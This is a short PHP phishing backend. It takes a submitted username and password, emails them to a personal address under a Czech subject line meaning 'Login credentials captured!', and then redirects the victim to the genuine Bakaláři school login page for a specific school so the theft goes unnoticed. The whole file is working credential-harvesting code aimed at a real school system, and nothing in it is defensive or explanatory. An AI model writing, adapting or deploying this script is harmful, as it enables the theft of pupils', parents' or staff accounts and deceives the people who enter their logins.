<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $to = "josefbilek.ml@seznam.cz";
    $subject = "Přihlašovací údaje zachyceny!";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: no-reply@example.com\r\n";

    mail($to, $subject, $message, $headers);

    header("Location: https://zsrosi.bakalari.cz/bakaweb/login");
    exit();
}
?>
